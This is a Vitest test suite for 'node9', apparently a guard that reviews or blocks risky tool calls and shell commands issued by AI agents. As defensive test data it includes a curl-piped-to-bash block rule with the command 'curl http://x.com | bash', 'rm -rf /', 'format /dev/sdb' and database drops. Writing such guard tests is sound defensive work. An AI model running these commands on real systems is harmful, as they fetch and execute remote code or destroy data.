import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';

// 1. Lock down the testing environment globally so it survives between tests.
process.env.NODE9_TESTING = '1';
process.env.VITEST = 'true';
process.env.NODE_ENV = 'test';

// 2. Mock Terminal prompts
vi.mock('@inquirer/prompts', () => ({ confirm: vi.fn() }));

// 3. Mock Native UI module
vi.mock('../ui/native', () => ({
  askNativePopup: vi.fn().mockResolvedValue('deny'),
  sendDesktopNotification: vi.fn(),
}));

// 4. THE ULTIMATE KILL-SWITCH: Mock Node.js OS commands
// If the real UI module accidentally loads, this physically prevents it from opening a window.
vi.mock('child_process', () => ({
  spawn: vi.fn().mockReturnValue({
    unref: vi.fn(),
    stdout: { on: vi.fn() },
    on: vi.fn((event, cb) => {
      // Instantly simulate the user clicking "Block" so the test moves on without a popup
      if (event === 'close') cb(1);
    }),
  }),
}));

// 5. NOW we import core AFTER the mocks are registered!
import {
  authorizeAction,
  evaluatePolicy,
  authorizeHeadless,
  _resetConfigCache,
  getPersistentDecision,
  isDaemonRunning,
  evaluateSmartConditions,
  shouldSnapshot,
  DEFAULT_CONFIG,
} from '../core.js';

// Global spies
const existsSpy = vi.spyOn(fs, 'existsSync');
const readSpy = vi.spyOn(fs, 'readFileSync');
vi.spyOn(fs, 'writeFileSync').mockImplementation(() => undefined);
vi.spyOn(fs, 'mkdirSync').mockImplementation(() => undefined);
const homeSpy = vi.spyOn(os, 'homedir');

async function getConfirm() {
  return vi.mocked((await import('@inquirer/prompts')).confirm);
}

// ── Config mock helpers ───────────────────────────────────────────────────────

function mockProjectConfig(config: object) {
  const projectPath = path.join(process.cwd(), 'node9.config.json');
  existsSpy.mockImplementation((p) => String(p) === projectPath);
  readSpy.mockImplementation((p) => (String(p) === projectPath ? JSON.stringify(config) : ''));
}

function mockGlobalConfig(config: object) {
  const globalPath = path.join('/mock/home', '.node9', 'config.json');
  existsSpy.mockImplementation((p) => String(p) === globalPath);
  readSpy.mockImplementation((p) => (String(p) === globalPath ? JSON.stringify(config) : ''));
}

function mockBothConfigs(projectConfig: object, globalConfig: object) {
  const projectPath = path.join(process.cwd(), 'node9.config.json');
  const globalPath = path.join('/mock/home', '.node9', 'config.json');
  existsSpy.mockImplementation((p) => [projectPath, globalPath].includes(String(p)));
  readSpy.mockImplementation((p) => {
    if (String(p) === projectPath) return JSON.stringify(projectConfig);
    if (String(p) === globalPath) return JSON.stringify(globalConfig);
    return '';
  });
}

/** Config that disables the native approver so racePromises can be empty
 *  and noApprovalMechanism tests work correctly. */
function mockNoNativeConfig(extra?: object) {
  mockGlobalConfig({
    settings: { approvers: { native: false }, ...(extra as Record<string, unknown>) },
  });
}

// ── Lifecycle ─────────────────────────────────────────────────────────────────

beforeEach(() => {
  _resetConfigCache();
  existsSpy.mockReturnValue(false);
  readSpy.mockReturnValue('');
  homeSpy.mockReturnValue('/mock/home');
  delete process.env.NODE9_API_KEY;
  Object.defineProperty(process.stdout, 'isTTY', { value: false, configurable: true });
});

afterEach(() => {
  vi.clearAllMocks();
});

// ── Ignored tool patterns ─────────────────────────────────────────────────────

describe('ignored tool patterns', () => {
  it.each([
    'list_users',
    'list_s3_buckets',
    'get_config',
    'get_user_by_id',
    'read_file',
    'read_object',
    'describe_table',
    'describe_instance',
  ])('allows "%s" without prompting', async (tool) => {
    const confirm = await getConfirm();
    expect(await authorizeAction(tool, {})).toBe(true);
    expect(confirm).not.toHaveBeenCalled();
  });
});

// ── Standard mode — safe tools ────────────────────────────────────────────────

describe('standard mode — safe tools', () => {
  it.each(['create_user', 'send_notification', 'invoke_lambda', 'start_job'])(
    'allows "%s" without prompting',
    async (tool) => {
      const confirm = await getConfirm();
      expect(await authorizeAction(tool, {})).toBe(true);
      expect(confirm).not.toHaveBeenCalled();
    }
  );
});

// ── Standard mode — dangerous word detection ──────────────────────────────────

describe('standard mode — dangerous word detection', () => {
  it.each([
    'drop_table',
    'truncate_logs',
    'purge_cache',
    'format_drive',
    'destroy_cluster',
    'terminate_server',
    'revoke_access',
    'docker_prune',
    'psql_execute',
  ])('evaluatePolicy flags "%s" as review (dangerous word match)', async (tool) => {
    expect((await evaluatePolicy(tool)).decision).toBe('review');
  });

  it('dangerous word match is case-insensitive', async () => {
    expect((await evaluatePolicy('DROP_DATABASE')).decision).toBe('review');
  });
});

// ── Persistent decision approval — approve / deny ─────────────────────────────

describe('persistent decision approval', () => {
  function setPersistentDecision(toolName: string, decision: 'allow' | 'deny') {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ [toolName]: decision }) : ''
    );
  }

  it('returns true when persistent decision is allow', async () => {
    // Using 'drop' because it triggers a review, thus checking the decision file
    setPersistentDecision('drop_db', 'allow');
    expect(await authorizeAction('drop_db', {})).toBe(true);
  });

  it('returns false when persistent decision is deny', async () => {
    setPersistentDecision('drop_db', 'deny');
    expect(await authorizeAction('drop_db', {})).toBe(false);
  });
});

// ── Bash tool — shell command interception ────────────────────────────────────

describe('Bash tool — shell command interception', () => {
  it.each([
    { cmd: 'psql -c "drop table"', desc: 'database drop' },
    { cmd: 'docker rm -f my_db', desc: 'docker removal' },
    { cmd: 'purge /var/log', desc: 'purge command' },
    { cmd: 'format /dev/sdb', desc: 'format command' },
    { cmd: 'truncate -s 0 /db.log', desc: 'truncate' },
  ])('blocks Bash when command is "$desc"', async ({ cmd }) => {
    expect((await evaluatePolicy('Bash', { command: cmd })).decision).toBe('review');
  });

  it.each([
    { cmd: 'rm -rf node_modules', desc: 'rm on node_modules (allowed by rule)' },
    { cmd: 'ls -la', desc: 'ls' },
    { cmd: 'cat /etc/hosts', desc: 'cat' },
    { cmd: 'npm install', desc: 'npm install' },
    { cmd: 'delete old_file.txt', desc: 'delete (low friction allow)' },
  ])('allows Bash when command is "$desc"', async ({ cmd }) => {
    expect((await evaluatePolicy('Bash', { command: cmd })).decision).toBe('allow');
  });

  it('authorizeHeadless blocks Bash drop when no approval mechanism', async () => {
    mockNoNativeConfig();
    const result = await authorizeHeadless('Bash', { command: 'drop database production' });
    expect(result.approved).toBe(false);
    expect(result.noApprovalMechanism).toBe(true);
  });
});

// ── False-positive regression ─────────────────────────────────────────────────

describe('false-positive regression — rm substring', () => {
  it.each(['confirm_action', 'check_permissions', 'perform_search'])(
    'does not block "%s"',
    async (tool) => {
      expect((await evaluatePolicy(tool)).decision).toBe('allow');
    }
  );
});

// ── Strict mode ───────────────────────────────────────────────────────────────

describe('strict mode', () => {
  beforeEach(() => {
    mockProjectConfig({
      settings: { mode: 'strict' },
      policy: { dangerousWords: [], ignoredTools: ['list_*'] },
      environments: {},
    });
  });

  it('intercepts non-dangerous tools that would pass in standard mode', async () => {
    expect((await evaluatePolicy('create_user')).decision).toBe('review');
  });

  it('still allows ignored tools', async () => {
    expect((await evaluatePolicy('list_users')).decision).toBe('allow');
  });
});

// ── Environment config ────────────────────────────────────────────────────────

describe('environment config', () => {
  it('strict mode blocks all non-dangerous tools by default', async () => {
    process.env.NODE_ENV = 'development';
    mockProjectConfig({
      settings: { mode: 'strict' },
      policy: { dangerousWords: [], ignoredTools: [] },
      environments: {},
    });
    // In strict mode every tool that isn't ignored requires approval
    expect((await evaluatePolicy('create_user')).decision).toBe('review');
  });

  it('standard mode allows non-dangerous tools regardless of environment', async () => {
    process.env.NODE_ENV = 'production';
    mockProjectConfig({
      settings: { mode: 'standard' },
      policy: { dangerousWords: ['delete'], ignoredTools: [] },
      environments: {},
    });
    // delete_user is dangerous in any mode — confirm standard mode still blocks it
    expect((await evaluatePolicy('delete_user')).decision).toBe('review');
    // Safe tools are always allowed in standard mode
    expect((await evaluatePolicy('invoke_lambda')).decision).toBe('allow');
  });
});

// ── Custom policy ─────────────────────────────────────────────────────────────

describe('custom policy', () => {
  it('respects user-defined dangerousWords', async () => {
    mockProjectConfig({
      settings: { mode: 'standard' },
      policy: { dangerousWords: ['deploy'], ignoredTools: [] },
      environments: {},
    });
    expect((await evaluatePolicy('deploy_to_prod')).decision).toBe('review');
  });

  it('respects user-defined ignoredTools', async () => {
    // Test that an ignoredTool allows even a 'nuke' word like drop
    mockProjectConfig({
      settings: { mode: 'standard' },
      policy: { dangerousWords: ['drop'], ignoredTools: ['drop_temp_*'] },
      environments: {},
    });
    expect((await evaluatePolicy('drop_temp_table')).decision).toBe('allow');
  });
});

// ── Global config ─────────────────────────────────────────────────────────────

describe('global config (~/.node9/config.json)', () => {
  it('is used when no project config exists', async () => {
    mockGlobalConfig({
      settings: { mode: 'standard' },
      policy: { dangerousWords: ['nuke'], ignoredTools: [] },
      environments: {},
    });
    expect((await evaluatePolicy('nuke_everything')).decision).toBe('review');
  });

  it('project config settings take precedence over global config settings', async () => {
    mockBothConfigs(
      {
        settings: { mode: 'standard' },
        policy: { dangerousWords: [], ignoredTools: [] },
        environments: {},
      },
      {
        settings: { mode: 'strict' },
        policy: { dangerousWords: [], ignoredTools: [] },
        environments: {},
      }
    );
    expect((await evaluatePolicy('create_user')).decision).toBe('allow');
  });
});

// ── authorizeHeadless — full coverage ─────────────────────────────────────────

describe('authorizeHeadless', () => {
  it('returns approved:true for safe tools', async () => {
    expect(await authorizeHeadless('list_users', {})).toEqual({ approved: true });
  });

  it('returns approved:false with noApprovalMechanism when no API key', async () => {
    mockNoNativeConfig();
    const result = await authorizeHeadless('drop_db', {});
    expect(result.approved).toBe(false);
    expect(result.noApprovalMechanism).toBe(true);
  });

  it('calls cloud API and returns approved:true on approval', async () => {
    mockGlobalConfig({
      settings: { slackEnabled: true, approvers: { native: false, cloud: true } },
    });
    process.env.NODE9_API_KEY = 'test-key';
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue({
        ok: true,
        json: async () => ({ approved: true, message: 'Approved via Slack' }),
      })
    );
    const result = await authorizeHeadless('drop_db', { id: 1 });
    expect(result.approved).toBe(true);
  });
});

// ── evaluatePolicy — project config ──────────────────────────────────────────

describe('evaluatePolicy — project config', () => {
  it('returns "review" for dangerous tool', async () => {
    // Changed 'delete_user' -> 'drop_user' to trigger the security review
    expect((await evaluatePolicy('drop_user')).decision).toBe('review');
  });

  it('returns "allow" for safe tool in standard mode', async () => {
    expect((await evaluatePolicy('create_user')).decision).toBe('allow');
  });

  it('respects project-level dangerousWords override', async () => {
    mockProjectConfig({
      settings: { mode: 'standard' },
      policy: { dangerousWords: ['deploy'], ignoredTools: [] },
      environments: {},
    });
    expect((await evaluatePolicy('deploy_app')).decision).toBe('review');
    // dangerousWords are additive — defaults still apply, use a clearly safe word
    expect((await evaluatePolicy('invoke_lambda')).decision).toBe('allow');
  });
});

// ── Persistent decisions ──────────────────────────────────────────────────────

describe('getPersistentDecision', () => {
  it('returns null when decisions file does not exist', () => {
    expect(getPersistentDecision('drop_user')).toBeNull();
  });

  it('returns "allow" when tool is set to always allow', () => {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ drop_user: 'allow' }) : ''
    );
    expect(getPersistentDecision('drop_user')).toBe('allow');
  });

  it('returns "deny" when tool is set to always deny', () => {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ drop_user: 'deny' }) : ''
    );
    expect(getPersistentDecision('drop_user')).toBe('deny');
  });

  it('returns null for an unrecognised value', () => {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ drop_user: 'maybe' }) : ''
    );
    expect(getPersistentDecision('drop_user')).toBeNull();
  });
});

describe('authorizeHeadless — persistent decisions', () => {
  it('approves without API when persistent decision is "allow"', async () => {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ drop_user: 'allow' }) : ''
    );
    // Use 'drop_user' so authorizeHeadless flags it as dangerous first,
    // then proceeds to check the persistent decision file.
    const result = await authorizeHeadless('drop_user', {});
    expect(result.approved).toBe(true);
  });

  it('blocks without API when persistent decision is "deny"', async () => {
    const decisionsPath = path.join('/mock/home', '.node9', 'decisions.json');
    existsSpy.mockImplementation((p) => String(p) === decisionsPath);
    readSpy.mockImplementation((p) =>
      String(p) === decisionsPath ? JSON.stringify({ drop_user: 'deny' }) : ''
    );
    const result = await authorizeHeadless('drop_user', {});
    expect(result.approved).toBe(false);
    expect(result.reason).toMatch(/always deny/i);
  });
});

// ── isDaemonRunning ───────────────────────────────────────────────────────────

// ── evaluateSmartConditions (unit) ────────────────────────────────────────────

describe('evaluateSmartConditions', () => {
  const makeRule = (
    conditions: Parameters<typeof evaluateSmartConditions>[1]['conditions'],
    conditionMode?: 'all' | 'any'
  ) => ({
    tool: '*',
    verdict: 'review' as const,
    conditions,
    conditionMode,
  });

  it('returns true when conditions array is empty', () => {
    expect(evaluateSmartConditions({ sql: 'SELECT 1' }, makeRule([]))).toBe(true);
  });

  it('returns false when args is not an object', () => {
    expect(evaluateSmartConditions(null, makeRule([{ field: 'sql', op: 'exists' }]))).toBe(false);
    expect(evaluateSmartConditions('string', makeRule([{ field: 'sql', op: 'exists' }]))).toBe(
      false
    );
  });

  describe('op: exists / notExists', () => {
    it('exists — returns true when field is present and non-empty', () => {
      expect(
        evaluateSmartConditions({ sql: 'SELECT 1' }, makeRule([{ field: 'sql', op: 'exists' }]))
      ).toBe(true);
    });
    it('exists — returns false when field is missing', () => {
      expect(evaluateSmartConditions({}, makeRule([{ field: 'sql', op: 'exists' }]))).toBe(false);
    });
    it('notExists — returns true when field is missing', () => {
      expect(evaluateSmartConditions({}, makeRule([{ field: 'sql', op: 'notExists' }]))).toBe(true);
    });
    it('notExists — returns false when field is present', () => {
      expect(
        evaluateSmartConditions({ sql: 'x' }, makeRule([{ field: 'sql', op: 'notExists' }]))
      ).toBe(false);
    });
  });

  describe('op: contains / notContains', () => {
    it('contains — matches substring', () => {
      expect(
        evaluateSmartConditions(
          { cmd: 'npm run build' },
          makeRule([{ field: 'cmd', op: 'contains', value: 'npm' }])
        )
      ).toBe(true);
    });
    it('contains — fails when substring absent', () => {
      expect(
        evaluateSmartConditions(
          { cmd: 'yarn build' },
          makeRule([{ field: 'cmd', op: 'contains', value: 'npm' }])
        )
      ).toBe(false);
    });
    it('notContains — true when substring absent', () => {
      expect(
        evaluateSmartConditions(
          { cmd: 'yarn build' },
          makeRule([{ field: 'cmd', op: 'notContains', value: 'npm' }])
        )
      ).toBe(true);
    });
  });

  describe('op: matches / notMatches', () => {
    it('matches — regex hit', () => {
      expect(
        evaluateSmartConditions(
          { sql: 'DELETE FROM users' },
          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' }])
        )
      ).toBe(true);
    });
    it('matches — regex miss', () => {
      expect(
        evaluateSmartConditions(
          { sql: 'SELECT * FROM users' },
          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' }])
        )
      ).toBe(false);
    });
    it('notMatches — true when regex does not match', () => {
      expect(
        evaluateSmartConditions(
          { sql: 'SELECT 1' },
          makeRule([{ field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' }])
        )
      ).toBe(true);
    });
    it('notMatches — false when regex matches', () => {
      expect(
        evaluateSmartConditions(
          { sql: 'DELETE FROM t WHERE id=1' },
          makeRule([{ field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' }])
        )
      ).toBe(false);
    });
    it('normalizes whitespace before matching', () => {
      // Double-space SQL should still be caught
      expect(
        evaluateSmartConditions(
          { sql: 'DELETE  FROM  users' },
          makeRule([{ field: 'sql', op: 'matches', value: '^DELETE\\s+FROM', flags: 'i' }])
        )
      ).toBe(true);
    });
    it('returns false for invalid regex (does not throw)', () => {
      expect(
        evaluateSmartConditions(
          { sql: 'x' },
          makeRule([{ field: 'sql', op: 'matches', value: '[invalid(' }])
        )
      ).toBe(false);
    });
  });

  describe('conditionMode', () => {
    it('"all" — requires every condition to pass', () => {
      const rule = makeRule(
        [
          { field: 'sql', op: 'matches', value: '^DELETE', flags: 'i' },
          { field: 'sql', op: 'notMatches', value: '\\bWHERE\\b', flags: 'i' },
        ],
        'all'
      );
      expect(evaluateSmartConditions({ sql: 'DELETE FROM users' }, rule)).toBe(true);
      expect(evaluateSmartConditions({ sql: 'DELETE FROM users WHERE id=1' }, rule)).toBe(false);
    });
    it('"any" — requires at least one condition to pass', () => {
      const rule = makeRule(
        [
          { field: 'sql', op: 'matches', value: '^DROP', flags: 'i' },
          { field: 'sql', op: 'matches', value: '^TRUNCATE', flags: 'i' },
        ],
        'any'
      );
      expect(evaluateSmartConditions({ sql: 'DROP TABLE users' }, rule)).toBe(true);
      expect(evaluateSmartConditions({ sql: 'TRUNCATE orders' }, rule)).toBe(true);
      expect(evaluateSmartConditions({ sql: 'SELECT 1' }, rule)).toBe(false);
    });
  });

  describe('dot-notation field paths', () => {
    it('accesses nested fields', () => {
      expect(
        evaluateSmartConditions(
          { params: { query: { sql: 'DELETE FROM t' } } },
          makeRule([{ field: 'params.query.sql', op: 'matches', value: '^DELETE', flags: 'i' }])
        )
      ).toBe(true);
    });
    it('returns false when nested path does not exist', () => {
      expect(
        evaluateSmartConditions(
          { params: {} },
          makeRule([{ field: 'params.query.sql', op: 'exists' }])
        )
      ).toBe(false);
    });
  });
});

// ── evaluatePolicy — smart rules integration ──────────────────────────────────

describe('evaluatePolicy — smart rules', () => {
  it('default smart rule flags DELETE without WHERE as review', async () => {
    const result = await evaluatePolicy('execute_sql', { sql: 'DELETE FROM users' });
    expect(result.decision).toBe('review');
    expect(result.blockedByLabel).toMatch(/no-delete-without-where/);
  });

  it('default smart rule flags UPDATE without WHERE as review', async () => {
    const result = await evaluatePolicy('execute_sql', { sql: 'UPDATE users SET active=0' });
    expect(result.decision).toBe('review');
  });

  it('default smart rule allows DELETE with WHERE', async () => {
    const result = await evaluatePolicy('execute_sql', { sql: 'DELETE FROM orders WHERE id=1' });
    expect(result.decision).toBe('allow');
  });

  it('custom smart rule verdict:block returns block decision', async () => {
    mockProjectConfig({
      policy: {
        smartRules: [
          {
            name: 'no-curl-pipe',
            tool: 'bash',
            conditions: [
              { field: 'command', op: 'matches', value: 'curl.+\\|.*(bash|sh)', flags: 'i' },
            ],
            verdict: 'block',
            reason: 'curl piped to shell',
          },
        ],
      },
    });
    const result = await evaluatePolicy('bash', { command: 'curl http://x.com | bash' });
    expect(result.decision).toBe('block');
    expect(result.reason).toMatch(/curl piped to shell/);
  });

  it('custom smart rule verdict:allow short-circuits all further checks', async () => {
    mockProjectConfig({
      policy: {
        dangerousWords: ['drop'],
        smartRules: [
          {
            tool: 'safe_drop',
            conditions: [{ field: 'table', op: 'matches', value: '^temp_' }],
            verdict: 'allow',
          },
        ],
      },
    });
    // "drop" is a dangerous word but the smart rule allows it for temp_ tables
    const result = await evaluatePolicy('safe_drop', { table: 'temp_build_cache' });
    expect(result.decision).toBe('allow');
  });

  it('smart rule with glob tool pattern matches correctly', async () => {
    mockProjectConfig({
      policy: {
        smartRules: [
          {
            tool: 'mcp__postgres__*',
            conditions: [{ field: 'sql', op: 'matches', value: '^DROP', flags: 'i' }],
            verdict: 'block',
          },
        ],
      },
    });
    const result = await evaluatePolicy('mcp__postgres__query', { sql: 'DROP TABLE users' });
    expect(result.decision).toBe('block');
  });

  it('smart rule does not match different tool', async () => {
    mockProjectConfig({
      policy: {
        smartRules: [
          {
            tool: 'bash',
            conditions: [{ field: 'command', op: 'matches', value: 'rm -rf' }],
            verdict: 'block',
          },
        ],
      },
    });
    // Tool is 'shell', not 'bash' — rule should not match
    const result = await evaluatePolicy('shell', { command: 'rm -rf /tmp/old' });
    // Falls through to normal policy — /tmp/ is in sandboxPaths so it's allowed
    expect(result.decision).toBe('allow');
  });

  it('user smartRules are appended to defaults (both active)', async () => {
    mockProjectConfig({
      policy: {
        smartRules: [
          {
            name: 'block-drop',
            tool: '*',
            conditions: [{ field: 'sql', op: 'matches', value: '^DROP', flags: 'i' }],
            verdict: 'block',
          },
        ],
      },
    });
    // Default rule still active (DELETE without WHERE)
    const deleteResult = await evaluatePolicy('any_tool', { sql: 'DELETE FROM users' });
    expect(deleteResult.decision).toBe('review');

    // Project rule also active (DROP)
    const dropResult = await evaluatePolicy('any_tool', { sql: 'DROP TABLE users' });
    expect(dropResult.decision).toBe('block');
  });
});

// ── authorizeHeadless — smart rule hard block ─────────────────────────────────

describe('authorizeHeadless — smart rule hard block', () => {
  it('returns approved:false without invoking race engine for block verdict', async () => {
    mockProjectConfig({
      policy: {
        smartRules: [
          {
            tool: 'bash',
            conditions: [{ field: 'command', op: 'matches', value: 'rm -rf /' }],
            verdict: 'block',
            reason: 'root wipe blocked',
          },
        ],
      },
    });
    const result = await authorizeHeadless('bash', { command: 'rm -rf /' });
    expect(result.approved).toBe(false);
    expect(result.reason).toMatch(/root wipe blocked/);
    expect(result.blockedBy).toBe('local-config');
  });
});

// ── shouldSnapshot ────────────────────────────────────────────────────────────
describe('shouldSnapshot', () => {
  const baseConfig = () => JSON.parse(JSON.stringify(DEFAULT_CONFIG)) as typeof DEFAULT_CONFIG;

  it('returns true for a default snapshot tool', () => {
    const config = baseConfig();
    expect(shouldSnapshot('str_replace_based_edit_tool', { file_path: 'src/app.ts' }, config)).toBe(
      true
    );
  });

  it('returns true for write_file with no path filters active', () => {
    const config = baseConfig();
    expect(shouldSnapshot('write_file', { file_path: 'src/index.ts' }, config)).toBe(true);
  });

  it('returns false for a non-snapshot tool (bash)', () => {
    const config = baseConfig();
    expect(shouldSnapshot('bash', { command: 'ls' }, config)).toBe(false);
  });

  it('returns false when enableUndo is false', () => {
    const config = baseConfig();
    config.settings.enableUndo = false;
    expect(shouldSnapshot('write_file', { file_path: 'src/app.ts' }, config)).toBe(false);
  });

  it('respects ignorePaths — skips node_modules', () => {
    const config = baseConfig();
    expect(
      shouldSnapshot('write_file', { file_path: 'node_modules/lodash/index.js' }, config)
    ).toBe(false);
  });

  it('respects ignorePaths — skips dist/', () => {
    const config = baseConfig();
    expect(shouldSnapshot('edit_file', { file_path: 'dist/bundle.js' }, config)).toBe(false);
  });

  it('respects ignorePaths — skips .log files', () => {
    const config = baseConfig();
    expect(shouldSnapshot('write_file', { file_path: 'logs/app.log' }, config)).toBe(false);
  });

  it('allows src/ path that does not match any ignorePaths', () => {
    const config = baseConfig();
    expect(shouldSnapshot('edit', { file_path: 'src/utils/helper.ts' }, config)).toBe(true);
  });

  it('respects onlyPaths — skips file outside onlyPaths when set', () => {
    const config = baseConfig();
    config.policy.snapshot.onlyPaths = ['src/**'];
    expect(shouldSnapshot('write_file', { file_path: 'scripts/deploy.sh' }, config)).toBe(false);
  });

  it('respects onlyPaths — allows file inside onlyPaths', () => {
    const config = baseConfig();
    config.policy.snapshot.onlyPaths = ['src/**'];
    expect(shouldSnapshot('write_file', { file_path: 'src/api/routes.ts' }, config)).toBe(true);
  });

  it('ignorePaths takes priority over onlyPaths', () => {
    const config = baseConfig();
    config.policy.snapshot.onlyPaths = ['src/**'];
    config.policy.snapshot.ignorePaths.push('src/generated/**');
    expect(shouldSnapshot('write_file', { file_path: 'src/generated/schema.ts' }, config)).toBe(
      false
    );
  });

  it('handles args with path key instead of file_path', () => {
    const config = baseConfig();
    expect(shouldSnapshot('write_file', { path: 'src/app.ts' }, config)).toBe(true);
  });

  it('handles args with filename key', () => {
    const config = baseConfig();
    expect(shouldSnapshot('write_file', { filename: 'src/app.ts' }, config)).toBe(true);
  });

  it('allows snapshot when no file path present and no onlyPaths set', () => {
    const config = baseConfig();
    // No file_path — ignorePaths/onlyPaths checks are skipped
    expect(shouldSnapshot('write_file', {}, config)).toBe(true);
  });

  it('user-added tool via config is snapshotted', () => {
    const config = baseConfig();
    config.policy.snapshot.tools.push('my_custom_write_tool');
    expect(shouldSnapshot('my_custom_write_tool', { file_path: 'src/foo.ts' }, config)).toBe(true);
  });
});

describe('isDaemonRunning', () => {
  it('returns false when PID file does not exist', () => {
    // existsSpy returns false (set in beforeEach)
    expect(isDaemonRunning()).toBe(false);
  });

  it('returns false when PID file has wrong port', () => {
    const pidPath = path.join('/mock/home', '.node9', 'daemon.pid');
    existsSpy.mockImplementation((p) => String(p) === pidPath);
    readSpy.mockImplementation((p) =>
      String(p) === pidPath ? JSON.stringify({ pid: process.pid, port: 9999 }) : ''
    );
    expect(isDaemonRunning()).toBe(false);
  });

  it('returns true when PID exists and process is alive', () => {
    const pidPath = path.join('/mock/home', '.node9', 'daemon.pid');
    existsSpy.mockImplementation((p) => String(p) === pidPath);
    readSpy.mockImplementation((p) =>
      // Use current process PID so kill(pid, 0) succeeds
      String(p) === pidPath ? JSON.stringify({ pid: process.pid, port: 7391 }) : ''
    );
    expect(isDaemonRunning()).toBe(true);
  });
});
